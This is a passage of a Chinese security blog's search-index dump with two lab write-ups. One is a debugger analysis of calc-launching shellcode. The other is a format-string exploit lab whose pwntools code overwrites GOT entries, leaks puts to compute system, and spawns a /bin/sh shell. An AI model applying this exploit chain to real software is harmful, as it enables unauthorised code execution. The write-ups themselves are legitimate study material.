1.针对实验一，通过gdb调试rop1，确定shellcode的地址；此外，通过rop1.py的调试脚本确定shellcod","title":"Rop"},{"content":"逆向分析计算器的漏洞利用过程 0x01 实验目的 根据实验软件SCer.exe 和 shellcode代码shellcode2020.mybin，通过windbg逆向分析弹出计算器的漏洞利用详细过程 根据实验软件shellcode2020.exe，通过Ollydbg逆向分析弹出计算器的漏洞利用详细过程。 分析两者区别。 0x02 试验工具 windbg Ollydbg IDA_PRO 因为Windows xp sp3下的Windbg微软将其在线Symbol符号下架，导致Windbg调试过程中，部分关键函数为乱码，无法正常分析，故借鉴Ida 实验环境 Windows xp sp3 0x03 windbg 调试 Scer.exe 打开Scer.exe，然后将shellcode.txt.mybin附加到程序，可以发现计算器可以正常打开。\n需要对Scer.exe进行动态调试分析，为了调试分析植入的shellcode,我们在shellcode.txt.bin前加上字节0xCC\n然后在windbg中附加 Scer.exe的进程。\n这里程序会停在系统代码区域，我们要进入用户代码里面。 WinDbg里有个伪寄存器叫$exentry，里面记录了程序的入口点。所以我们只要在命令输入栏里输入bp $exentry 然后执行命令g即可进入用户程序入口。 这里结合IDA_pro，F5反编译可以看到 这里实现了程序的初始化，就不在过多分析。 这里通过IDA_PRO，找到我们加载核心代码shellcode 的首地址。\n首先shift+F12查看字符串，找到字符串状态:0x%0.8x 已载入shellcode,即将开始执行...，一路反跟踪函数返回，找到该段功能的首地址为：0x401830 也就是说在此段代码中，我们实现了向程序中输入shellcode后，程序如何处理shellcode以及如何跳转到shellcode的过程 在windbg 下 设置断点 bp 0x401830\n加载我们的shellcode 后，就可以在windbg中调试 看到程序怎么将shellcode存放起来并执行。 然后输入pc跳转到下一个call 指令，然后步入，这个函数为 CreateFileA。\n发现该函数功能实现了创建一个线程\u0026mdash;\u0026mdash;\u0026mdash;-打开文件夹，即我们的shellcode文件。 继续pc跳转到下一个函数地址，这个函数为 VirtualAlloc\n这里查看一下VirtualAlloc函数的结构\n1 2 3 4 5 6 LPVOID VirtualAlloc{ LPVOID lpAddress, // 要分配的内存区域的地址 DWORD dwSize, // 分配的大小 DWORD flAllocationType, // 分配的类型 DWORD flProtect // 该内存的初始保护属性 }; 并且与调入函数前传入的参数相结合对比，\n发现 ebx 存取的是 我们shellcode 的字节长度，esi存放的是 程序给 shellcode 分配的动态地址。\n程序执行完毕后，很明显可以发现了esi 存取的 地址为 0xb40000\n这里就实现了为 shellcode的存取 提前分配好了 动态地址， 起始地址为 0xb40000\n继续pc跳转到下一个call函数，该函数名字为 ReadFile\n这里查看一下VirtualAlloc函数的结构\n1 2 3 4 5 6 7 8 9 BOOL ReadFile( HANDLE hFile, //文件的句柄 LPVOID lpBuffer, //用于保存读入数据的一个缓冲区 DWORD nNumberOfBytesToRead, //要读入的字节数 LPDWORD lpNumberOfBytesRead, //指向实际读取字节数的指针 LPOVERLAPPED lpOverlapped //如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。 //该结构定义了一次异步读取操作。否则，应将这个参数设为NULL ); 此时的寄存器情况：\n将函数结构 与 传参前的 汇编语言进行 对比。\n可以发现函数实现了在地址为esi :: 0xb40000 的缓冲区 存取了 长度为27 字节的 shellcode。\n继续pc进行到sleep函数。\n因为要等待此时的线程完成。 继续p指令 单步跳过，一直到\n此段整体汇编代码对应用IDA_Pro显示\nmov bp+ms_exc.registration.TryLevel], 0 ; 进入第一个__try域,TryLevel=0\nmov ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh ; 离开第一个__try域，TryLevel=TRYLEVEL_NONE (-2)\n所以此段为 try_except 的过程。\n然后发现存在汇编语句call eax\ncall eax 来自 [ebp + var_24]\n追踪发现 [ebp+var_24]存放的是esi的地址，即0xb40000 因此这段代码，就是程序进入预先分配好的动态内存区(里面存有shellcode）的入口。\n进入函数，分析shellcode。\n程序执行到0xb40001跳转到地址0xb40019，然后发现在地址0xb40019的 jmp 指令跳转到 0xb40003\n这里解释么要先call 跳转到 0xb40019然后再回到0xb40003\ncall/pop指令 Shellcode可以通过在一个call指令后立即执行pop指令，将上一刻压入栈中的指令地址载入到寄存器中，从而获取到shellcode起始的内存地址。 原理就是：call 指令实际上就是 先将该函数的下一个地址压入栈中，然后跳转到目的地址。跳转之后再将其pop出来，这样就达到了ebx 存放 地址0xb4001e的作用。 这里通过call 0xb40003指令调用完之后对栈的分析，可以看出。 显然，栈最顶层为calc.exe 存放的地址。 然后开始 pop ebx ，将 eax 清零。\n然后向栈中压入 ebx,eax。 ebx此时存放的地址为0xb4001e即字符串\\x63\\x61x6c\\x63\\x2e\\x65\\x78\\x65对应的calc.exe\n将函数kernel32!WinExec地址传给ebx。\n上面两个压栈相当于 对下面的函数 kernel32!WinExec进行传参。\n1 2 UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow ); 这样就相当于调用函数 winExec(\u0026quot;calc.exe\u0026quot;,0)来打开计算器。\n函数调用完成后。将eax置0，然后入栈，将函数kernel32!ExitProcess地址传给ebx。相当于向函数kernel32!ExitProcess传入参数，结束调用的进程及其所有的线程windows函数。\nshellcode分析完毕。\n在命令中输入g，即可弹出计算器。\n0x04 Ollydbg 调试 shellcode2020.exe 直接执行shellcode2020.exe会直接弹出计算器。\n动态分析前:\n通过IDA_Pro 可以直接定位到 main函数地址为 : 0x401290 在Ollydbg中设置断点0x401290,然后运行程序跳转到该地址\n1 2 3 4 5 6 7 8 9 10 push ebp mov ebp,esp 更新函数栈帧 sub esp,8 and esp,FFFFFFF0 mov eax,0 add eax,0f add eax,0f shr eax,4 shl eax,4 将 (eax + 0f + 0f )先左移一位，后右移一位，结果为00000010 然后进入到地址为0x401710的函数，结合IDA，该函数为alloca函数，产生函数指针。\n1 2 3 4 5 6 7 8 原型： void * __cdecl alloca(size_t); 参数： size_t: 申请分配内存的尺寸 返回值： void*: 分配到的内存地址 alloca与malloc,calloc,realloc类似,需要注意的是它申请的是“栈(stack)”空间的内存，用完会在退出栈时自动释放，无需手动释放。 alloca不宜使用在必须广泛移植的程序中, 因为有些机器不一定有传统意义上的\u0026#34;堆栈\u0026#34; 进入函数0x4013b0，执行加载函数，将shellcode加载到代码区。\n然后设置断点 0x4012ba，然后单步步入\n发现dword ptr[ebp - 4]被赋值为地址0x402000 观察IDA，发现地址0x40200的地方存取的数据为evil数组，即shellcode存放地址。 同时0x402000也是文件执行过程中，data端的起始位置。 步入，查看shellcode。\n发现大致流程和windbg分析过程一样。\n通过call和pop结合运用，将ebx赋值为 地址0x40201d ebx此时存放的为字符串calc.exe 然后同样的压栈操作，调用函数Kernel32!WinExec进行执行计算器。\n执行完毕后，又将eax置0 ，将函数kernel32!ExitProcess的地址传给ebx,调用ebx地址所在的程序，即ExitProcess(\u0026lsquo;0\u0026rsquo;)，退出程序。\n0x05 总结(区别) Scer.exe创造一个新的线程，然后通过读取文件内容作为shellcode，并通过VirtualAlloc申请内存，xp里面这个内存地址均为0xb40000并且用esi保存这个地址，然后ReadFile即在虚拟地址0xb40000中写入shellcode，然后通过format,update等函数shellcode进行转换，最后地址将其作为一个函数指针，进行调用，进入shellcode。 shellcode2020.exe则是在文件的.data端 存放我们的shellcode。通过函数alloca来在堆上申请内存，并且用函数指针对其调用，最后调用.data的起始地址，运行我们构造的shellcode,可以运行计算器。 因此两者的区别：一个是从外部植入shellcode，将其加载到内存中，另一个是程序本身自带的shellcode，通过构造函数指针来执行shellcode。 ","permalink":"http://www.reus09.top/posts/tech/shellcode-%E8%AE%A1%E7%AE%97%E5%99%A8/","summary":"逆向分析计算器的漏洞利用过程 0x01 实验目的 根据实验软件SCer.exe 和 shellcode代码shellcode2020.mybin，通过win","title":"Shellcode 计算器"},{"content":"格式化字符串漏洞 0x01 目的 通过格式化字符串掌握泄露内存数据和覆写内存。 0x02 基础知识 格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参数，并对这些参数进行处理。而格式化字符串将C语言的主要数据类型，以易于阅读的方式保存在字符串里。从程序输出数据、打印错误信息到处理字符串数据，格式化字符串几乎出现在所有的C程序中。\nprintf 功能：向stdout按规定的格式输出信息；\n格式：\n1 int printf (const char *format,[argument]...) format是格式控制字符串，其他参数为输出项； printf(\u0026quot;Id=%d\u0026quot;,Id); sprintf 功能：把格式化的数据写入某个字符串中；\n格式：\n1 int sprintf(char *buffer,const char *format,[argument]...) buffer是要卸乳字符串的缓冲区； 函数按照第二部分格式化字符的格式，把第三部分的数据进行格式化，然后在把格式化后的数据类型，存储到字符串的缓存区间里去； sprintf(buffer, \u0026quot;Id=%d\u0026quot;, Id); snprintf 功能：把格式化的数据写入某个字符串中，控制字符串长度；\n格式：\n1 int snprintf(char *str,size_t size,const char *format,[argument]...) 在sprintf的基础上限制了可写入字符的最大值size； 当格式化后的字符串长度=size，则将其中的size-1个字符复制到str中，并在最后添加字符串结束符\\0； sprintf(buffer, 10,\u0026quot;Id=%d\u0026quot;, Id); fprintf 功能：用于格式化输出到一个流/文件中；\n格式：\n1 int fprintf(FILE *stream,const char *format,[argument]...) 根据指定的格式控制字符串format向输出流stream中写入数据； 当stream为stdout时，fprintf与printf的功能相同； printf(pfile,\u0026quot;Id=%d\u0026quot;,Id); vprintf/vsprintf/vsnprintf/vfprintf 功能分别对应于printf/sprintf/snprintf/fprintf； 将变参列表换成了va_list类型的参数 格式： vprintf (format,va_list); vsprintf (buffer,format,va_list); vsnprintf (buffer,256,format,va_list); vfprintf(stream, format, va_list); 格式化字符串 格式化字符串是由普通字符串和格式化规定字符构成的字符序列：\n普通字符被原封不动地复制到输出流中； 格式化规定字符则是以%开始，用来确定输出内容格式； 基本格式\n%[parameter][flags][fieldwidth][.precision][length]type\nparameter\n可以忽略或者是n$，n表示是参数列表的第n个参数，通过这种形式直接访问第n个参数； flags\n用于调整输出和打印的符号、空白、小数点、八进制和十六进制前缀等； fieldwidth\n限制显示数值的最小宽度，当输出字符个数不足限制的宽度时，默认用空格填充，或者flags中的其他填充方式，超过限制宽度不会截断，正常显示； precision\n输出的最大长度； length\n指浮点型参数或者整形参数的长度； hh：1-byte； h：2-byte； l：4-byte； ll：8-byte； type\n转换说明符，用来说明所应用的转换类型，它是唯一必须的格式域；\n| 字符 | 描述 | | —— | —————————————————————————————— | | d/i | 有符号十进制整数 | | u | 无符号十进制整数 | | x/X | 以十六进制形式输出无符号整数(不输出前缀0x) | | o | 以八进制形式输出无符号整数(不输出前缀0) | | s | 字符串 | | c | 字符 | | p | 指针 | | n | 不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量 | | f/F | 以小数形式输出单、双精度实数 | | e/E | 以指数形式输出单、双精度实数 | | g/G | 以%f%e中较短的输出宽度输出单、双精度实数，%e格式在指数小于-4或者大于等于精度时使用 | | a/A | 浮点数、十六进制数字和p-计数法 |\n0x03 漏洞原理 格式化字符串函数是根据格式化字符串函数来进行解析的，那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制；\n根据cdecl的调用约定，在进入printf()函数之前，将参数从右到左依次压栈。进入printf()之后,函数首先获取第一个参数，一次读取一个字符。如果字符不是%，字符直接复制到输出中；否则，读取下一个非空字符，获取相应的参数并解析输出。 格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值，发生了格式化字符串漏洞。\n0x04 漏洞分析 分析 用IDAPro对format1程序进行分析，程序逻辑简单，在main函数中调用了getname函数 查看getname()函数，读取用户输入，发现print(buf)将用户输入进行打印，存在格式化字符串漏洞。 由于程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，这两个表是一一对应的，看到带有**@plt**标志的函数时，这个函数其实就是个过渡作用，可以通过PLT表跳转到GOT表来得到函数真正的地址： 利用思路 将exit函数的GOT表地址覆写为main函数的地址，程序每次退出时将再返回到main函数； 通过printf格式化字符串漏洞，获取puts函数地址，再通过libc的相对地址偏移获取system的地址； 用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，并在buf 中写入/bin/sh，当执行printf(buf)时，相当于执行system('/bin/sh')； 利用过程 将exit函数的GOT表地址覆盖为main函数地址 将exit函数的GOT表地址覆写为main函数的地址，每次退出时将再返回到main函数。 先解决构建printf（format，[argument]）中format和argument\nformat覆写的格式为：% width c % num $ hhn\nwidth是将要写入到$hhn参数中的值，它由覆写的值和已经写入的长度决定，具体为：（已写入的长度-覆写的值）%0x80 根据反汇编可以看到buf数组的长度为0x80 num定了要写入的第num个参数，通过调试具体分析一下 这里给出两种方法\n用gdb调试\n在main和printf处设置断点。 然后运行程序，运行到printf地方 buf的地址为0xffffd12c,是printf中格式化字符串的第7个参数:即(0xffffd12c - 0xffffd110 ) / 4 = 7 通过pwntools进行查找\n简单的exp:\n1 2 3 4 5 6 7 8 from pwn import * context.log_level=\u0026#39;debug\u0026#39; p = process(\u0026#39;./format1\u0026#39;) payload = b\u0026#39;a\u0026#39; * 4 + b\u0026#39; \u0026#39; + b\u0026#39; %08x\u0026#39; * 20 print(payload) p.sendline(payload) p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) 运行结果如下\n明显的看到0x61616161即为第七个参数 num的确定\n因为要把exit的GOT地址覆写为main函数地址，即0x8048648，所以应写入四个字节，即重复四次% width c % num $ hhn； 粗略估计width最多占用3个字节，num最多占用2个字节，则每个格式% widthc % num $ hhn占用12个字节，四次重复共48个字节，占用48/4=12个参数； 由于buf是从第7个参数开始，写入的地址从第7+12=19个参数开始，num依次为19、20、21、22； 确定exit@got的地址；\n这里同样给出两种方法 gdb查看反汇编指令 先disass main查看main函数地址 发现exit@plt的地址为0x8048480 然后查看disass 0x8048480的反汇编，即进入exit@plt的函数内部 jmp所对应的的地址即为exit@got 为 0x804a024 直接借用gdb中的got命令 exit@got 为 0x804a024 main函数地址\n第一条即为main函数地址 ： 0x08048648 构造格式化字符串:\n确定了num和width，也确定了exit函数的got表地址为0x804a024，所以将要覆盖的exit@got地址0x804a024、0x804a025、0x804a026、0x804a027依次写入到第19、20、21、22个参数中，格式化字符串就构造好了：\n1 %72c%19$hhn%62c%20$hhn%126c%21$hhn%4c%22$hhnaaaa\\x24\\xa0\\x04\\x08\\x25\\xa0\\x04\\x08\\x26\\xa0\\x04\\ x08\\x27\\xa0\\x04\\x08 编写generate_format(addr, value)函数构造格式化字符串，addr为要覆写的地址，value为覆写的值，函数代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def generate_format(addr,value): payload=\u0026#39;\u0026#39; # 已写入的长度 print_count = 0 addr_part = \u0026#39;\u0026#39; # range 4 的原因是 地址为四个字节，四个循环即可结束。 for i in range(4): if value \u0026gt;\u0026gt; (8*i) == 0: break one_byte = (value \u0026gt;\u0026gt; (8*i)) \u0026amp; 0xff # 0x100的原因 防止出现负数 payload += \u0026#39;%{0}c%{1}$hhn\u0026#39;.format((one_byte - print_count + 0x100) % 0x100,19+i) print_count += (one_byte - print_count) % 0x100 addr_part += p32(addr+i).decode(\u0026#39;unicode_escape\u0026#39;) payload = payload.ljust((12)*4,\u0026#39;a\u0026#39;) payload += addr_part return payload 调用generate_format(exit_got,main)函数，生成的payload作为输入，执行后可以看到exit的got表的第一个地址被覆盖为main函数的地址，即0x08048648； 获取system的地址 获取思路分析\n由于格式化字符串漏洞能够泄露内存关键数据，可以考虑利用这个漏洞泄露system 的地址，利用格式化字符串漏洞，泄露出GOT表中puts的地址，再利用libc中system函数与puts函数的偏移，计算出system地址； 先获取puts函数的got表地址，(这里与上面的方法相同)，所以puts函数got表的地址为0x804a01c，虽然可以直接查看0x804a01c内容即可得到puts函数的实际地址，这里使用格式化字符串漏洞来获取；\n构造格式化字符串\n构造的格式化字符串格式为：%num$s+puts@got，即把puts@got的地址写入 buf，再通过%s读出； 此时读出的puts地址为 puts在程序中真正运行的地址 其中%num$s占4个字节，是第7个参数；puts@got占4个字节，是第8个参数，num就可以写为8，即将puts@got的地址写入到第8个参数的位置； 获取了puts的实际地址后，通过libc中两个函数的偏移即可得到system的地址，通过查阅资料可以得到libc的库的位置为/lib/i386-linux-gnu/libc.so.6； 所以get_sys_addr 有如下代码\n1 2 3 4 5 6 7 8 9 10 11 p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) puts_got_addr = elf.got[\u0026#34;puts\u0026#34;] payload_puts = \u0026#34;%8$s\u0026#34; + p32(puts_got_addr).decode(\u0026#39;unicode_escape\u0026#39;) p.sendline(payload_puts) p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) puts_addr = u32(p.recv(4)) libc = ELF(\u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34;) offset = libc.symbols[\u0026#39;puts\u0026#39;]-libc.symbols[\u0026#39;system\u0026#39;] sys_addr = puts_addr - offset 运行结果\n根据接收到的四个字节，我们可以看到拿到puts地址为0xf7e37cd0,system地址为0xf7e0b830 将其我们用gdb调试得到的地址相比，正确 覆写got 表中printf地址 原理与覆写exit函数GOT表相同，调用generate_format(printf@got,system_addr)，生成的payload作为输入，代码如下：\n1 2 3 4 printf_got = elf.got[\u0026#39;printf\u0026#39;] payload_system = generate_format(printf_got,sys_addr) p.sendline(payload_system) 运行代码 可以发现printf@got被覆盖为0xf7e0b830 执行system(\u0026rsquo;/bin/sh') 此时GOT表中printf地址已被覆写为system地址，在buf中输入/bin/sh，执行printf(buf)时，相当于执行system('/bin/sh')，最后代码如下:\n1 2 3 4 p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) p.sendline(\u0026#34;/bin/sh\u0026#34;) p.interactive() 运行编写的python代码，成功拿到shell权限；\n0x05 总结 格式化字符串漏洞泄露内存数据和覆写内存理解加深。 Linux中got表和plt表的关系进一步理解。 pwntools查看函数参数的位置的一些用法 pwntools可以直接导入elf,process,libc库 ","permalink":"http://www.reus09.top/posts/tech/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","summary":"格式化字符串漏洞 0x01 目的 通过格式化字符串掌握泄露内存数据和覆写内存。 0x02 基础知识 格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参","title":"格式化字符串"},{"content":"","permalink":"http://www.reus09.top/about/","summary":"","title":"About"},{"content":"","permalink":"http://www.reus09.top/links/","summary":"","title":"Links"}]